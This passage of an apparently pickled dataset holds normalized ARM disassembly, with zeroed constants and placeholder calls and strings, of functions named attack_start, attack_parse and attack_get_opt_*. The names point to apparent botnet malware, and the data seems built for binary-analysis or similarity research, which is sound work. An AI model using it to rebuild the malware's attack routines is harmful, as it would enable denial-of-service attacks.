FOO\nADD~R3,SP,0\nADD~R3,R3,0\nLDR~R12,[SP,0]\nADD~R0,R3,R12\nLDR~R1,[SP,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nCMP~R0,0\nBLT~FOO\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R0,R1,R0\nMOV~R3,0\nLDR~R2,[SP,0]\nSTRB~R3,[R0,R2]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R6,-0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R1,[SP,0]\nADD~R0,R12,R1\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R6,-0]\nMOV~R4,0\nSTR~R4,[R6]\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nLDR~R7,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R5,R3,R7\nMOV~R0,R5\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nMOV~R0,R5\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R0\nLDRB~R3,[R3,R7]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R0,[SP,0]\nADD~R5,R0,R4\nMOV~R0,R5\nLDR~R2,[SP,0]\nRSB~R1,R4,R2\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R0,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nMOV~R2,0\nSTRB~R2,[R3,R0]\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nCMP~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R6]\nMOV~R4,0\nSTR~R4,[R6,0]\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nLDR~R7,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R5,R3,R7\nMOV~R0,R5\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,R4\nBL~FOO\nMOV~R2,R0\nMOV~R0,R5\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R0\nLDRB~R3,[R3,R7]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R0,[SP,0]\nADD~R5,R0,R4\nMOV~R0,R5\nLDR~R2,[SP,0]\nRSB~R1,R4,R2\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R0,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nMOV~R2,0\nSTRB~R2,[R3,R0]\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nCMP~R0,0\nMOVNE~R3,0\nSTRNE~R3,[R6,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nLDR~R5,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R4,R3,R5\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVEQ~R3,0\nSTREQ~R3,[R6,0]\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R0\nLDRB~R3,[R3,R5]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R0,[SP,0]\nADD~R5,R0,R4\nMOV~R0,R5\nLDR~R2,[SP,0]\nRSB~R1,R4,R2\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R0,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nMOV~R2,0\nSTRB~R2,[R3,R0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTR~R0,[R6,0]\nMOV~R12,0\nSTR~R12,[SP,0]\nB~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R10,R0\nADD~R0,SP,0\nADD~R0,R0,0\nLDR~R1,[SP,0]\nADD~R3,R0,R1\nLDR~R2,[SP,0]\nADD~R3,R3,R2\nLDRB~R3,[R3,R10]\nCMP~R3,0\nADDEQ~R10,R10,0\nADD~R8,R4,R10\nLDR~R12,[SP,0]\nLDR~R0,[SP,0]\nRSB~R3,R0,R12\nRSB~R7,R10,R3\nMOV~R0,R8\nMOV~R1,R7\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nCMN~R0,0\nBEQ~FOO\nLDR~R1,[SP,0]\nADD~R11,R1,R10\nLDR~R2,[SP,0]\nADD~R5,R2,R11\nCMP~R0,0\nSUBGT~R4,R0,0\nMOV~R0,R8\nMOV~R1,R7\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nMOV~R0,R8\nMOV~R1,R7\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nSUB~R4,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R0,[SP,0]\nADD~R3,R3,R0\nMOV~R1,0\nSTRB~R1,[R3,R11]\nMOV~R3,0\nADD~R2,SP,0\nSTR~R3,[R2,0]\nB~FOO\nLDRB~R3,[R5,R4]\nCMP~R3,0\nBEQ~FOO\nADD~R3,R4,0\nADD~R12,SP,0\nSTR~R3,[R12,0]\nMOV~R0,R5\nBL~FOO\nADD~R1,SP,0\nLDR~R4,[R1,0]\nCMP~R0,R4\nBGT~FOO\nLDRB~R3,[R5,R4]\nCMP~R3,0\nBNE~FOO\nMOV~R1,0\nADD~R2,SP,0\nSTR~R1,[R2,0]\nLDR~R3,[R6,0]\nCMP~R3,R1\nBLE~FOO\nMOV~R1,R1,LSL0\nADD~R1,R1,0\nMOV~R0,R5\nADD~R1,R9,R1\nMOV~R2,R4\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R1,R3,0\nSTR~R1,[R12,0]\nLDR~R3,[R6,0]\nCMP~R3,R1\nBLE~FOO\nB~FOO\nLDR~R0,[R6,0]\nMOV~R0,R0,LSL0\nADD~R0,R0,0\nADD~R0,R9,R0\nMOV~R1,R5\nBL~FOO\nLDR~R3,[R6,0]\nADD~R3,R3,0\nSTR~R3,[R6,0]\nLDR~R0,[SP,0]\nADD~R0,R0,R10\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nLDR~R2,[SP,0]\nADD~R4,R1,R2\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nLDR~R3,[R6,0]\nCMP~R3,0\nBLE~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nLDR~R5,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R4,R3,R5\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R0\nLDRB~R3,[R3,R5]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R0,[SP,0]\nADD~R5,R0,R4\nMOV~R0,R5\nLDR~R2,[SP,0]\nRSB~R1,R4,R2\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R0,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nMOV~R2,0\nSTRB~R2,[R3,R0]\nADD~R4,R0,0\nMOV~R0,R5\nMOV~R1,R4\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R3,0\nADD~R12,SP,0\nSTR~R3,[R12,0]\nLDRB~R3,[R5,0]\nCMP~R3,0\nSUBEQ~R3,R3,0\nSTREQ~R3,[R12,0]\nADD~R0,SP,0\nLDR~R2,[R0,0]\nMOV~R0,R5\nADD~R1,R5,R2\nRSB~R2,R2,R4\nBL~FOO\nMOV~R2,0\nADD~R1,SP,0\nSTR~R2,[R1,0]\nLDRB~R3,[R5]\nCMP~R3,R2\nBEQ~FOO\nCMP~R3,0\nMOVEQ~R1,R5\nBEQ~FOO\nB~FOO\nADD~R3,R3,0\nCMP~R2,0\nBNE~FOO\nMOV~R3,0\nSTRB~R3,[R1]\nB~FOO\nMOV~R3,0\nADD~R12,SP,0\nSTR~R3,[R12,0]\nADD~R1,R5,R3\nLDRB~R2,[R3,R5]\nCMP~R2,0\nBNE~FOO\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBLE~FOO\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,0\nADD~R0,R9,R0\nMOV~R1,R5\nBL~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R5,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R3,0\nADD~R4,R9,R3\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R2,SP,0\nLDR~R0,[R2,0]\nADD~R0,R5,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R3,SP,0\nLDR~R1,[R3,0]\nADD~R1,R5,R1\nMOV~R0,R4\nADD~R1,R1,0\nBL~FOO\nB~FOO\nLDRB~R3,[R5]\nCMP~R3,0\nBNE~FOO\nMOV~R3,0\nADD~R4,R9,R3\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R12,SP,0\nLDR~R0,[R12,0]\nADD~R0,R5,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R5,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nADD~R2,SP,0\nLDR~R1,[R2,0]\nADD~R1,R5,R1\nMOV~R0,R4\nADD~R1,R1,0\nBL~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nSTRB~R3,[R12,-0]\nB~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nLDR~R5,[SP,0]\nADD~R0,SP,0\nADD~R0,R0,0\nADD~R4,R0,R5\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R4,R0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R1,R0\nLDRB~R3,[R3,R5]\nCMP~R3,0\nADDEQ~R4,R0,0\nLDR~R2,[SP,0]\nADD~R5,R2,R4\nMOV~R0,R5\nLDR~R3,[SP,0]\nRSB~R1,R4,R3\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nSUBGT~R7,R0,0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R12,R4\nLDR~R0,[SP,0]\nADD~R3,R3,R0\nMOV~R1,0\nSTRB~R1,[R3,R7]\nMOV~R3,0\nADD~R2,SP,0\nSTR~R3,[R2,0]\nLDRB~R1,[R5]\nSUB~R3,R1,0\nCMP~R3,0\nMOVHI~R3,R5\nBHI~FOO\nMOV~R2,0\nADD~R2,R2,0\nADD~R12,SP,0\nSTR~R2,[R12,0]\nLDRB~R1,[R2,R5]\nSUB~R3,R1,0\nCMP~R3,0\nBLS~FOO\nADD~R3,R5,R2\nCMP~R1,0\nBEQ~FOO\nMOV~R0,0\nSTRB~R0,[R3]\nADD~R1,SP,0\nLDR~R3,[R1,0]\nADD~R2,R3,0\nSTR~R2,[R1,0]\nLDRB~R3,[R5,R2]\nCMP~R3,0\nADDEQ~R3,R2,0\nSTREQ~R3,[R1,0]\nADD~R2,SP,0\nLDR~R4,[R2,0]\nADD~R4,R5,R4\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nLDR~R6,<STR>\nMOV~R0,R4\nMOV~R2,R6\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nLDR~R4,[R3,0]\nADD~R4,R5,R4\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nMOV~R2,R6\nBL~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R3,R3,R0\nSTR~R3,[R12,0]\nADD~R0,SP,0\nLDR~R4,[R0,0]\nLDRB~R3,[R5,R4]\nCMP~R3,0\nBNE~FOO\nADD~R4,R4,0\nSTR~R4,[R0,0]\nADD~R4,R5,R4\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nLDRB~R3,[R4,-0]\nCMP~R3,0\nBNE~FOO\nADD~R1,SP,0\nLDR~R4,[R1,0]\nADD~R4,R5,R4\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nMOV~R2,0\nSTRB~R2,[R4,-0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSUB~R3,R0,0\nCMP~R3,0\nLDRLS~R3,[SP,0]\nADDLS~R4,R3,R0\nBLS~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nCMP~R4,R0\nBHI~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R4,R5,R3\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nLDR~R2,<STR>\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R3,0\nADD~R0,SP,0\nSTR~R3,[R0,0]\nLDRB~R3,[R4,0]\nCMP~R3,0\nSUBEQ~R3,R3,0\nSTREQ~R3,[R0,0]\nADD~R1,SP,0\nLDR~R3,[R1,0]\nADD~R2,R7,0\nMOV~R0,R4\nADD~R1,R4,R3\nRSB~R2,R3,R2\nBL~FOO\nMOV~R3,0\nADD~R2,SP,0\nSTR~R3,[R2,0]\nLDRB~R3,[R4]\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nMOVEQ~R1,R4\nBEQ~FOO\nB~FOO\nADD~R3,R3,0\nCMP~R2,0\nBNE~FOO\nMOV~R12,0\nSTRB~R12,[R1]\nB~FOO\nMOV~R3,0\nADD~R0,SP,0\nSTR~R3,[R0,0]\nADD~R1,R3,R4\nLDRB~R2,[R3,R4]\nCMP~R2,0\nBNE~FOO\nMOV~R0,R4\nBL~FOO\nCMP~R0,0\nBLE~FOO\nMOV~R0,R4\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,0\nADD~R0,R9,R0\nMOV~R1,R4\nBL~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R4,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R3,0\nADD~R5,R9,R3\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nADD~R2,SP,0\nLDR~R0,[R2,0]\nADD~R0,R4,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R3,SP,0\nLDR~R1,[R3,0]\nADD~R1,R4,R1\nMOV~R0,R5\nADD~R1,R1,0\nBL~FOO\nB~FOO\nLDRB~R3,[R4]\nCMP~R3,0\nBNE~FOO\nADD~R12,SP,0\nLDR~R0,[R12,0]\nADD~R0,R4,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R3,0\nADD~R5,R9,R3\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nADD~R1,SP,0\nLDR~R0,[R1,0]\nADD~R0,R4,R0\nADD~R0,R0,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nADD~R2,SP,0\nLDR~R1,[R2,0]\nADD~R1,R4,R1\nMOV~R0,R5\nADD~R1,R1,0\nBL~FOO\nMOV~R0,0\nADD~R0,R9,R0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nSTRB~R3,[R12,-0]\nB~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nLDR~R2,[SP,0]\nADD~R0,R1,R2\nLDR~R1,[SP,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R5,R0\nMOV~R3,0\nADD~R4,R9,R3\nMOV~R0,R4\nLDR~R1,<STR>\nBL~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R4\nLDR~R1,<STR>\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nSTRB~R3,[R12,-0]\nB~FOO\nLDR~R0,[SP,0]\nCMP~R0,R5\nMOVGT~R3,0\nLDRGT~R1,[SP,0]\nSTRGTB~R3,[R1,-0]\nMOVLE~R3,0\nLDRLE~R2,[SP,0]\nSTRLEB~R3,[R2,-0]\nLDR~R0,[R6,-0]\nADD~R3,SP,0\nADD~R3,R3,0\nLDR~R12,[SP,0]\nADD~R1,R3,R12\nMOV~R2,R5\nMOV~R3,0\nBL~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nMOV~R3,0\nSTR~R3,[R4]\nB~FOO\nLDR~R0,[SP,0]\nLDRB~R3,[R0,-0]\nCMP~R3,0\nBNE~FOO\nLDR~R3,[R6,0]\nCMP~R3,0\nBNE~FOO\nMOV~R1,0\nADD~R1,R9,R1\nMOV~R0,R1\nADD~R1,R1,0\nMOV~R2,0\nBL~FOO\nLDR~R3,[R6,0]\nSUB~R3,R3,0\nSTR~R3,[R6,0]\nBL~FOO\nMOV~R4,R0\nMOV~R1,0\nSTR~R1,[R0]\nMOV~R3,0\nADD~R8,R9,R3\nLDR~R2,[R6,0]\nLDR~R0,[R6,-0]\nADD~R1,R8,R2\nRSB~R2,R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nMOVEQ~R3,0\nSTREQ~R3,[R4]\nBEQ~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nMOV~R3,0\nLDR~R2,[SP,0]\nSTRB~R3,[R2,-0]\nB~FOO\nLDR~R3,[R6,0]\nADD~R3,R3,R0\nSTR~R3,[R6,0]\nLDR~R12,[SP,0]\nSTR~R12,[R6,-0]\nMOV~R11,0\nADD~R0,R9,0\nSTR~R0,[SP,0]\nLDR~R3,[R6,0]\nCMP~R3,0\nBLE~FOO\nLDR~R5,[R6,0]\nCMP~R3,R5\nMOVLT~R4,R3\nMOVGE~R4,R5\nRSB~R3,R4,R3\nSTR~R3,[R6,0]\nLDR~R7,[R6,-0]\nCMP~R7,0\nBNE~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R8\nMOV~R1,R5\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nLDR~R4,[R6,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R8\nMOV~R1,R4\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nADD~R5,R8,R0\nLDR~R1,[R6,0]\nLDR~R11,<STR>\nMOV~R0,R5\nRSB~R1,R4,R1\nMOV~R2,R11\nMOV~R3,R7\nBL~FOO\nADD~R10,R4,R0\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R3,R10,R9\nMOV~R2,0\nLDR~R1,[SP,0]\nSTRB~R2,[R3,R1]\nLDR~R3,[R6,0]\nCMP~R3,0\nBGT~FOO\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~R0,[R6,0]\nMOV~R0,R0,LSL0\nLDR~R3,[SP,0]\nADD~R0,R3,R0\nMOV~R1,R5\nBL~FOO\nLDR~R4,[R6,0]\nMOV~R4,R4,LSL0\nLDR~R12,[SP,0]\nADD~R4,R12,R4\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nLDR~R1,<STR>\nBL~FOO\nADD~R4,R10,0\nADD~R5,R8,R4\nLDR~R1,[R6,0]\nMOV~R0,R5\nRSB~R1,R4,R1\nMOV~R2,R11\nMOV~R3,R7\nBL~FOO\nADD~R4,R4,R9\nADD~R4,R4,R0\nMOV~R1,0\nLDR~R0,[SP,0]\nSTRB~R1,[R4,R0]\nLDR~R4,[R6,0]\nMOV~R4,R4,LSL0\nLDR~R2,[SP,0]\nADD~R4,R2,R4\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nMOV~R1,R5\nBL~FOO\nLDR~R3,[R6,0]\nADD~R3,R3,0\nSTR~R3,[R6,0]\nMOV~R3,0\nSTR~R3,[R6,0]\nADD~R3,R3,0\nLDR~R12,[SP,0]\nSTRB~R3,[R12,-0]\nB~FOO\nMOV~R4,0\nLDR~R5,[R6,0]\nCMP~R5,0\nBNE~FOO\nLDR~R7,[R6,0]\nCMP~R7,0\nBNE~FOO\nLDR~R10,<STR>\nMOV~R0,R8\nLDR~R1,[R6,0]\nMOV~R2,R10\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R8\nLDR~R1,[R6,0]\nMOV~R2,R10\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nADD~R3,R0,R9\nSTRB~R5,[R3,0]\nLDR~R10,<STR>\nMOV~R0,R8\nMOV~R1,R4\nMOV~R2,R10\nMOV~R3,R7\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R8\nMOV~R1,R4\nMOV~R2,R10\nMOV~R3,R7\nBL~FOO\nADD~R0,R0,R9\nSTRB~R5,[R0,0]\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nADD~R3,R0,0\nSTR~R3,[R6,0]\nB~FOO\nLDR~R3,[R6,0]\nRSB~R3,R4,R3\nSTR~R3,[R6,0]\nCMP~R3,0\nBEQ~FOO\nCMP~R4,0\nBEQ~FOO\nLDR~R2,[R6,0]\nRSB~R2,R4,R2\nSTR~R2,[R6,0]\nMOV~R0,R8\nADD~R1,R8,R4\nBL~FOO\nLDR~R1,[R6,0]\nADD~R2,R11,0\nADD~R3,R1,R9\nMOV~R0,0\nSTRB~R0,[R3,R2]\nCMP~R1,0\nBEQ~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nBL~FOO\nMOV~R4,R0\nMOV~R7,0\nMOV~R5,0\nSTR~R7,[R4]\nLDR~R0,[R6,-0]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R2,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nMOV~R12,0\nLDR~R3,[SP,0]\nSTRB~R12,[R3,-0]\nB~FOO\nMOV~R3,0\nLDR~R0,[SP,0]\nSTRB~R3,[R0,-0]\nB~FOO\nMOV~R3,0\nLDR~R1,[SP,0]\nSTRB~R3,[R1,-0]\nB~FOO\nLDR~R2,[SP,0]\nLDRB~R3,[R2,-0]\nCMP~R3,0\nMOVNE~R3,0\nSTRNEB~R3,[R2,-0]\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R3,0\nLDR~R12,[SP,0]\nADD~R12,R12,R3\nSTR~R12,[SP,0]\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nCMP~R0,R1\nBEQ~FOO\nB~FOO\nMOV~R0,R5\nBL~FOO\nCMP~R0,0\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p176
L8240L
tp177
a(S'attack_get_opt_str'
p178
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R3\nAND~R0,R0,0\nAND~R2,R2,0\nCMP~R0,0\nBLE~FOO\nLDRB~R3,[R1,0]\nCMP~R3,R2\nADDNE~R12,R1,0\nMOVNE~LR,0\nBNE~FOO\nB~FOO\nMOV~R1,R12\nLDRB~R3,[R12,0]\nADD~R12,R12,0\nCMP~R3,R2\nBNE~FOO\nLDR~R4,[R1]\nB~FOO\nADD~LR,LR,0\nCMP~LR,R0\nBNE~FOO\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p179
L96L
tp180
a(S'attack_get_opt_ip'
p181
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R3\nAND~R0,R0,0\nAND~R2,R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nBL~FOO\nMOV~R4,R0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p182
L48L
tp183
a(S'attack_get_opt_int'
p184
S'"STMFD~SP!,{R4,LR}\nMOV~R4,R3\nAND~R0,R0,0\nAND~R2,R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p185
L52L
tp186
a(S'attack_start'
p187
S'"STMFD~SP!,{R4-R8,R10,LR}\nMOV~R5,R0\nMOV~R10,R3\nAND~R6,R1,0\nAND~R7,R2,0\nLDRB~R8,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R4,R3\nORRGT~R4,R3,0\nCMP~R4,0\nLDMNEFD~SP!,{R4-R8,R10,PC}\nBL~FOO\nCMN~R0,0\nMOVEQ~R0,R4\nBLEQ~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R3,<STR>\nLDRB~R0,[R3]\nCMP~R0,0\nBLE~FOO\nLDR~R3,<STR>\nLDR~R1,[R3]\nLDR~R12,[R1]\nLDRB~R3,[R12,0]\nCMP~R3,R6\nMOVNE~R2,0\nBNE~FOO\nB~FOO\nMOV~R0,R5\nBL~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R12,[R1,R2,LSL0]\nLDRB~R3,[R12,0]\nCMP~R3,R6\nBNE~FOO\nMOV~R0,R7\nMOV~R1,R10\nMOV~R2,R8\nLDR~R3,[SP,0]\nMOV~LR,PC\nLDR~PC,[R12]\nB~FOO\nADD~R2,R2,0\nCMP~R2,R0\nBNE~FOO\nMOV~R0,0\nBL~FOO"'
p188
L224L
tp189
a(S'attack_parse'
p190
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R5,R0\nMOV~R4,R1\nCMP~R1,0\nBLS~FOO\nLDR~R10,[R0]\nCMP~R1,0\nBEQ~FOO\nLDRB~R1,[R0,0]\nSTR~R1,[SP,0]\nCMP~R4,0\nBEQ~FOO\nLDRB~R0,[R0,0]\nCMP~R0,0\nBEQ~FOO\nSUB~R7,R4,0\nMOV~R6,R0\nMOV~R3,R0,LSL0\nADD~R8,R3,R0\nCMP~R7,R8\nBCC~FOO\nADD~R9,R5,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nSTR~R0,[SP,0]\nSUBS~R2,R6,0\nSTR~R2,[SP,0]\nBLE~FOO\nMOV~R12,R5\nMOV~R1,R0\nMOV~R7,0\nMOV~LR,0\nADD~R0,R8,R5\nLDR~R2,[R12,0]\nSTR~R2,[R1,0]\nLDRB~R3,[R12,0]\nSTRB~R3,[R1,0]\nSTRB~R7,[R1]\nSTRB~LR,[R1,0]\nSTR~R2,[R1,0]\nADD~R12,R12,0\nADD~R1,R1,0\nCMP~R0,R12\nBNE~FOO\nADD~R9,R12,0\nMOV~R3,R6,LSL0\nADD~R3,R3,R6\nRSB~R3,R3,R4\nSUB~R7,R3,0\nCMP~R7,0\nSTREQ~R7,[SP,0]\nBEQ~FOO\nLDRB~R3,[R9]\nSTR~R3,[SP,0]\nCMP~R3,0\nSTREQ~R3,[SP,0]\nBEQ~FOO\nLDR~R0,[